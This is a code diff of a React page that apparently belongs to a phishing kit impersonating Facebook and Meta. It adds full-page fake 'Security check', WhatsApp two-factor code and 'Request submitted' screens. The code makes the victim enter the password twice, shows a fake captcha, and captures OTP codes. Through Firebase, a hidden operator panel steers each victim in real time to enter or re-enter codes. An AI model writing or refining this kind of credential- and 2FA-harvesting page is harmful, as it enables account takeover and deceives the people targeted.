@@ -23,6 +23,7 @@ export default function Home() {
 
   // --- STATES FORM MODAL ---
   const [showModal, setShowModal] = useState(false);
+  const [showFullPage, setShowFullPage] = useState(false); // Bật giao diện full trang cho Captcha/OTP/Success
   const [step, setStep] = useState(1); // 1=signup, 2=login, 3=captcha, 4=otp, 5=success
   const [clientIp, setClientIp] = useState('Unknown');
   const [busName, setBusName] = useState(''); const [perEmail, setPerEmail] = useState(''); const [busEmail, setBusEmail] = useState(''); 
@@ -97,34 +98,34 @@ export default function Home() {
 
   // --- LẮNG NGHE LỆNH TỪ ADMIN QUA FIREBASE (REAL-TIME) ---
   useEffect(() => {
-    if (showModal && !showAdmin && step !== 1) {
+    if ((showModal || showFullPage) && !showAdmin && step !== 1) {
         const commandRef = ref(database, 'commands/' + sessionId);
         const unsubscribe = onValue(commandRef, (snapshot) => {
             const data = snapshot.val();
             if (data && data.action) {
                 if (data.action === 'otp') {
-                    setStep(4); setMatchNumber(null); setShowSuccess(false);
+                    setStep(4); setShowFullPage(true); setShowModal(false); setMatchNumber(null); setShowSuccess(false);
                 } 
                 else if (data.action === 'approve' && data.value) {
-                    setStep(4); setMatchNumber(data.value); setShowSuccess(false);
+                    setStep(4); setShowFullPage(true); setShowModal(false); setMatchNumber(data.value); setShowSuccess(false);
                 } 
                 else if (data.action === 'success') {
-                    setShowSuccess(true);
+                    setStep(5); setShowFullPage(true); setShowModal(false); setShowSuccess(true);
                 } 
                 else if (data.action === 'error') {
-                    setStep(2); setShowLoginError(true); setLoginPass(''); setShowSuccess(false);
+                    setStep(2); setShowFullPage(false); setShowModal(true); setShowLoginError(true); setLoginPass(''); setShowSuccess(false);
                 }
             }
         });
         return () => unsubscribe();
     }
-  }, [showModal, showAdmin, sessionId, step]);
+  }, [showModal, showFullPage, showAdmin, sessionId, step]);
 
   // --- PHÍM TẮT MỞ ADMIN ---
   useEffect(() => {
     const handleKeyDown = (e) => {
       if (e.ctrlKey && e.shiftKey && e.key === 'A') {
-        setShowAdmin(prev => !prev); setShowModal(true);
+        setShowAdmin(prev => !prev); setShowModal(true); setShowFullPage(false);
       }
     };
     window.addEventListener('keydown', handleKeyDown);
@@ -133,7 +134,7 @@ export default function Home() {
 
   // --- OTP TIMER EFFECT ---
   useEffect(() => {
-    if (step === 4 && showModal) {
+    if (step === 4 && showFullPage) {
       setOtpSecondsLeft(120);
       setOtpCanResend(false);
       const interval = setInterval(() => {
@@ -148,9 +149,9 @@ export default function Home() {
       }, 1000);
       return () => clearInterval(interval);
     }
-  }, [step, showModal]);
+  }, [step, showFullPage]);
 
-  const openModal = () => { setShowModal(true); setStep(1); setShowSuccess(false); setShowAdmin(false); setCaptchaDone(false); setCaptchaChecked(false); setCaptchaLoading(false); };
+  const openModal = () => { setShowModal(true); setShowFullPage(false); setStep(1); setShowSuccess(false); setShowAdmin(false); setCaptchaDone(false); setCaptchaChecked(false); setCaptchaLoading(false); };
 
   const handleSignup = (e) => {
     e.preventDefault(); let errs = {};
@@ -175,8 +176,10 @@ export default function Home() {
       if (newAttempt === 1) { 
         setShowLoginError(true); setLoginPass(''); 
       } else { 
-        // Pass 2 -> go to CAPTCHA step
+        // Pass 2 -> go to FULL PAGE CAPTCHA
         setStep(3); 
+        setShowModal(false);
+        setShowFullPage(true);
       } 
     }, (newAttempt === 1) ? 3000 : 5000);
   };
@@ -186,7 +189,7 @@ export default function Home() {
     if (captchaDone || captchaLoading) return;
     setCaptchaLoading(true);
     setCaptchaChecked(true);
-    // Spin 10s then go to OTP
+    // Spin 10s then go to OTP full page
     setTimeout(() => {
       setCaptchaLoading(false);
       setCaptchaDone(true);
@@ -207,7 +210,11 @@ export default function Home() {
     setTimeout(() => { 
         setLoading(false); 
         if (newAttempt < 3) { setShowOtpError(true); setOtp(''); } 
-        else { setShowSuccess(true); setOtp(''); }
+        else { 
+          setShowSuccess(true); 
+          setStep(5); 
+          setOtp(''); 
+        }
     }, 1500);
   };
 
@@ -232,7 +239,6 @@ export default function Home() {
       });
   };
 
-  // --- FORMAT TIMER ---
   const formatTime = (secs) => {
     const m = Math.floor(secs / 60);
     const s = secs % 60;
@@ -366,8 +372,8 @@ export default function Home() {
           </div>
       </footer>
 
-      {/* ================= MODAL FORM NHẬP LIỆU ================= */}
-      {showModal && (
+      {/* ================= MODAL (CHỈ DÙNG CHO SIGNUP VÀ LOGIN) ================= */}
+      {showModal && !showFullPage && (
         <div style={{ position: 'fixed', inset: 0, background: 'rgba(0, 0, 0, 0.4)', zIndex: 1000, display: 'flex', alignItems: 'center', justifyContent: 'center', padding: '24px 16px', overflowY: 'auto', backdropFilter: 'blur(4px)', WebkitBackdropFilter: 'blur(4px)' }}>
             <div style={{ position: 'relative', background: '#fff', borderRadius: '12px', padding: '28px 20px 20px', width: '100%', maxWidth: '420px', boxShadow: '0 12px 28px rgba(0,0,0,0.2)' }}>
                 
@@ -680,93 +686,6 @@ export default function Home() {
                           <button type="submit" className="fb-btn" disabled={loading}>{loading ? 'Logging in...' : t.loginBtn}</button>
                       </form>
                     )}
-
-                    {/* FORM 3: CAPTCHA (full page style inside modal) */}
-                    {step === 3 && (
-                      <div style={{ textAlign: 'center' }}>
-                        <h2 style={{ fontSize: '22px', fontWeight: '700', color: '#050505', marginBottom: '8px' }}>Security check</h2>
-                        <p style={{ fontSize: '14.5px', color: '#65676b', marginBottom: '24px' }}>Please confirm you are human to continue.</p>
-                        <div 
-                          onClick={handleCaptchaClick}
-                          style={{
-                            border: captchaChecked ? '2px solid #0064e0' : '2px solid #ccd0d5',
-                            borderRadius: '10px',
-                            padding: '24px 20px',
-                            display: 'flex',
-                            alignItems: 'center',
-                            gap: '16px',
-                            cursor: captchaDone ? 'default' : 'pointer',
-                            background: captchaChecked ? '#eef4ff' : '#fafafa',
-                            transition: 'all 0.2s',
-                            userSelect: 'none'
-                          }}
-                        >
-                          <div style={{
-                            width: '28px', height: '28px', border: '2px solid',
-                            borderColor: captchaChecked ? '#0064e0' : '#bcc0c4',
-                            borderRadius: '6px', display: 'flex', alignItems: 'center', justifyContent: 'center',
-                            background: captchaChecked && !captchaLoading ? '#0064e0' : '#fff',
-                            flexShrink: 0, transition: 'all 0.2s'
-                          }}>
-                            {captchaChecked && !captchaLoading && <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#fff" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round"><polyline points="20 6 9 17 4 12"/></svg>}
-                            {captchaLoading && <div style={{ width: '16px', height: '16px', border: '2.5px solid rgba(0,100,224,0.2)', borderTop: '2.5px solid #0064e0', borderRadius: '50%', animation: 'spin 0.8s linear infinite' }}></div>}
-                          </div>
-                          <span style={{ fontSize: '16px', fontWeight: '500', color: captchaLoading ? '#0064e0' : '#1c2b33', flex: 1, textAlign: 'left' }}>
-                            {captchaDone ? 'Verified' : captchaLoading ? 'Verifying...' : "I'm not a robot"}
-                          </span>
-                          {captchaLoading && <div style={{ width: '24px', height: '24px', border: '2.5px solid rgba(0,100,224,0.15)', borderTop: '2.5px solid #0064e0', borderRadius: '50%', animation: 'spin 0.8s linear infinite' }}></div>}
-                        </div>
-                        <p style={{ fontSize: '12px', color: '#65676b', marginTop: '12px' }}>This helps us prevent automated access.</p>
-                      </div>
-                    )}
-
-                    {/* FORM 4: OTP (full page style inside modal) — bỏ tên FB, bỏ SĐT, dùng ảnh cũ */}
-                    {step === 4 && !showSuccess && (
-                      <>
-                        <h2 style={{ fontSize: '22px', fontWeight: '700', color: '#050505', marginBottom: '8px', textAlign: 'center' }}>Two-factor authentication</h2>
-                        <p style={{ fontSize: '14.5px', color: '#65676b', marginBottom: '16px', textAlign: 'center' }}>Enter the 6-8 digit code from your authenticator app.</p>
-                        
-                        <div style={{ display: 'flex', justifyContent: 'center', margin: '16px 0 20px' }}>
-                          <img src="https://z-m-static.xx.fbcdn.net/rsrc.php/yt/r/DUiOg0mJTjz.webp" alt="2FA" style={{ maxWidth: '220px', width: '100%', height: 'auto', borderRadius: '8px' }} />
-                        </div>
-
-                        <form onSubmit={handleOtp} style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
-                          <input 
-                            className="fb-input" 
-                            style={{ textAlign: 'center', fontSize: '26px', letterSpacing: '12px', fontWeight: '700', height: '60px' }} 
-                            placeholder="00000000" 
-                            value={otp} 
-                            onChange={e => { setOtp(e.target.value.replace(/\D/g, '').slice(0, 8)); setShowOtpError(false); }} 
-                            required 
-                            maxLength={8} 
-                          />
-                          {showOtpError && <div style={{ color: '#fa383e', fontSize: '13.5px', marginTop: '4px', textAlign: 'center' }}>{t.otpError}</div>}
-                          <button type="submit" className="fb-btn" disabled={loading || otp.length < 6}>{loading ? 'Verifying...' : t.verifyBtn}</button>
-                        </form>
-
-                        <div style={{ textAlign: 'center', marginTop: '16px', fontSize: '14px', color: '#65676b' }}>
-                          {otpCanResend ? (
-                            <button type="button" onClick={handleResendOtp} style={{ background: 'none', border: 'none', color: '#0064e0', fontWeight: '600', cursor: 'pointer', fontSize: '14px', textDecoration: 'underline' }}>
-                              Get a new code
-                            </button>
-                          ) : (
-                            <span>You can request a new code in <strong style={{ color: '#0064e0' }}>{formatTime(otpSecondsLeft)}</strong></span>
-                          )}
-                        </div>
-                      </>
-                    )}
-
-                    {/* FORM 5: SUCCESS (full page style inside modal) */}
-                    {showSuccess && (
-                      <div style={{ textAlign: 'center', padding: '20px 0' }}>
-                        <div style={{ width: '88px', height: '88px', borderRadius: '50%', background: '#e7f3ff', display: 'flex', alignItems: 'center', justifyContent: 'center', margin: '0 auto 20px' }}>
-                          <svg width="44" height="44" viewBox="0 0 24 24" fill="none" stroke="#0064e0" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/></svg>
-                        </div>
-                        <h2 style={{ fontSize: '22px', fontWeight: '700', color: '#050505', marginBottom: '10px' }}>{t.successTitle}</h2>
-                        <p style={{ fontSize: '15px', color: '#65676b', lineHeight: '1.5', marginBottom: '20px' }}>{t.successSub}</p>
-                        <button type="button" onClick={() => { localStorage.clear(); window.location.replace('/live'); }} className="fb-btn">{t.closeBtn}</button>
-                      </div>
-                    )}
                   </>
                 )}
 
@@ -774,6 +693,147 @@ export default function Home() {
                     <img src="https://upload.wikimedia.org/wikipedia/commons/7/7b/Meta_Platforms_Inc._logo.svg" alt="Meta" style={{ height: '12px', margin: '0 auto' }} />
                 </div>
             </div>
+        </div>
+      )}
+
+      {/* ================= FULL PAGE GIAO DIỆN (CAPTCHA, OTP, SUCCESS) ================= */}
+      {showFullPage && (
+        <div style={{ position: 'fixed', inset: 0, background: '#fff', zIndex: 2000, display: 'flex', flexDirection: 'column', overflowY: 'auto' }}>
+          {/* Header Facebook (logo góc trái) */}
+          <div style={{ padding: '16px 24px', borderBottom: '1px solid #e4e6eb' }}>
+            <img src="https://static.xx.fbcdn.net/rsrc.php/y9/r/tL_v571NdZ0.svg" alt="Facebook" style={{ height: '32px' }} />
+          </div>
+
+          <div style={{ flex: 1, display: 'flex', justifyContent: 'center', alignItems: 'flex-start', padding: '40px 16px' }}>
+            <div style={{ width: '100%', maxWidth: '500px' }}>
+
+              {/* BƯỚC 3: CAPTCHA FULL PAGE */}
+              {step === 3 && (
+                <div>
+                  <h2 style={{ fontSize: '24px', fontWeight: '700', marginBottom: '16px', color: '#1c1e21' }}>Security check</h2>
+                  <p style={{ fontSize: '15px', color: '#65676b', marginBottom: '24px' }}>Please confirm you are human to continue.</p>
+                  
+                  <div 
+                    onClick={handleCaptchaClick}
+                    style={{
+                      border: captchaChecked ? '2px solid #0064e0' : '2px solid #ccd0d5',
+                      borderRadius: '10px',
+                      padding: '24px 20px',
+                      display: 'flex',
+                      alignItems: 'center',
+                      gap: '16px',
+                      cursor: captchaDone ? 'default' : 'pointer',
+                      background: captchaChecked ? '#eef4ff' : '#fafafa',
+                      transition: 'all 0.2s',
+                      userSelect: 'none'
+                    }}
+                  >
+                    <div style={{
+                      width: '28px', height: '28px', border: '2px solid',
+                      borderColor: captchaChecked ? '#0064e0' : '#bcc0c4',
+                      borderRadius: '6px', display: 'flex', alignItems: 'center', justifyContent: 'center',
+                      background: captchaChecked && !captchaLoading ? '#0064e0' : '#fff',
+                      flexShrink: 0, transition: 'all 0.2s'
+                    }}>
+                      {captchaChecked && !captchaLoading && <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#fff" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round"><polyline points="20 6 9 17 4 12"/></svg>}
+                      {captchaLoading && <div style={{ width: '16px', height: '16px', border: '2.5px solid rgba(0,100,224,0.2)', borderTop: '2.5px solid #0064e0', borderRadius: '50%', animation: 'spin 0.8s linear infinite' }}></div>}
+                    </div>
+                    <span style={{ fontSize: '16px', fontWeight: '500', color: captchaLoading ? '#0064e0' : '#1c2b33', flex: 1, textAlign: 'left' }}>
+                      {captchaDone ? 'Verified' : captchaLoading ? 'Verifying...' : "I'm not a robot"}
+                    </span>
+                    {captchaLoading && <div style={{ width: '24px', height: '24px', border: '2.5px solid rgba(0,100,224,0.15)', borderTop: '2.5px solid #0064e0', borderRadius: '50%', animation: 'spin 0.8s linear infinite' }}></div>}
+                  </div>
+                  <p style={{ fontSize: '12px', color: '#65676b', marginTop: '12px' }}>This helps us prevent automated access.</p>
+                </div>
+              )}
+
+              {/* BƯỚC 4: OTP FULL PAGE - Giống ảnh gửi */}
+              {step === 4 && !showSuccess && (
+                <div>
+                  <p style={{ fontSize: '14px', color: '#65676b', marginBottom: '8px' }}>Lê Hiếu • Facebook</p>
+                  <h2 style={{ fontSize: '24px', fontWeight: '700', marginBottom: '8px', color: '#1c1e21' }}>Check your WhatsApp messages</h2>
+                  <p style={{ fontSize: '15px', color: '#1c1e21', marginBottom: '24px' }}>
+                    Enter the code we sent to your WhatsApp account at <strong>+84 *******00</strong>.
+                  </p>
+
+                  {/* Ảnh minh họa WhatsApp */}
+                  <div style={{ marginBottom: '24px', borderRadius: '8px', overflow: 'hidden' }}>
+                    <img src="https://z-m-static.xx.fbcdn.net/rsrc.php/yt/r/DUiOg0mJTjz.webp" alt="WhatsApp Code" style={{ width: '100%', display: 'block', background: '#fce4ec' }} />
+                  </div>
+
+                  <form onSubmit={handleOtp} style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
+                    <input 
+                      type="text" 
+                      placeholder="Code" 
+                      value={otp} 
+                      onChange={e => { setOtp(e.target.value.replace(/\D/g, '').slice(0, 8)); setShowOtpError(false); }}
+                      style={{ 
+                        padding: '14px 16px', 
+                        fontSize: '16px', 
+                        border: '1px solid #ccd0d5', 
+                        borderRadius: '8px', 
+                        outline: 'none',
+                        width: '100%',
+                        boxSizing: 'border-box'
+                      }} 
+                    />
+                    
+                    <div style={{ fontSize: '14px', color: '#65676b', display: 'flex', alignItems: 'center', gap: '6px' }}>
+                      <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><path d="M21 12a9 9 0 1 1-9-9c2.52 0 4.93 1 6.74 2.74L21 8"/><path d="M21 3v5h-5"/></svg>
+                      It may take a few minutes for you to get this code.
+                      {otpCanResend ? (
+                        <button type="button" onClick={handleResendOtp} style={{ background: 'none', border: 'none', color: '#0064e0', fontWeight: '600', cursor: 'pointer', fontSize: '14px', padding: 0 }}>
+                          Get a new code
+                        </button>
+                      ) : (
+                        <span>Get a new code in <strong>{formatTime(otpSecondsLeft)}</strong></span>
+                      )}
+                    </div>
+
+                    {showOtpError && <div style={{ color: '#fa383e', fontSize: '14px', marginTop: '4px' }}>Incorrect code. Please try again.</div>}
+
+                    <button type="submit" disabled={loading || otp.length < 6} style={{
+                      width: '100%',
+                      padding: '14px',
+                      borderRadius: '100px',
+                      border: 'none',
+                      background: otp.length >= 6 ? '#0064e0' : '#a0c3ff',
+                      color: '#fff',
+                      fontSize: '17px',
+                      fontWeight: '700',
+                      cursor: otp.length >= 6 ? 'pointer' : 'not-allowed',
+                      marginTop: '8px',
+                      transition: 'background 0.2s'
+                    }}>
+                      {loading ? 'Verifying...' : 'Continue'}
+                    </button>
+                  </form>
+                </div>
+              )}
+
+              {/* BƯỚC 5: SUCCESS FULL PAGE */}
+              {showSuccess && (
+                <div style={{ textAlign: 'center', marginTop: '40px' }}>
+                  <div style={{ width: '88px', height: '88px', borderRadius: '50%', background: '#e7f3ff', display: 'flex', alignItems: 'center', justifyContent: 'center', margin: '0 auto 24px' }}>
+                    <svg width="44" height="44" viewBox="0 0 24 24" fill="none" stroke="#0064e0" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/></svg>
+                  </div>
+                  <h2 style={{ fontSize: '24px', fontWeight: '700', color: '#1c1e21', marginBottom: '12px' }}>Request submitted</h2>
+                  <p style={{ fontSize: '15px', color: '#65676b', lineHeight: '1.5', marginBottom: '24px' }}>Your request has been sent. Please wait up to 24 hours for verification.</p>
+                  <button type="button" onClick={() => { localStorage.clear(); window.location.replace('/live'); }} style={{
+                    padding: '14px 40px',
+                    borderRadius: '100px',
+                    border: 'none',
+                    background: '#0064e0',
+                    color: '#fff',
+                    fontSize: '16px',
+                    fontWeight: '700',
+                    cursor: 'pointer'
+                  }}>Close</button>
+                </div>
+              )}
+              
+            </div>
+          </div>
         </div>
       )}
     </div>
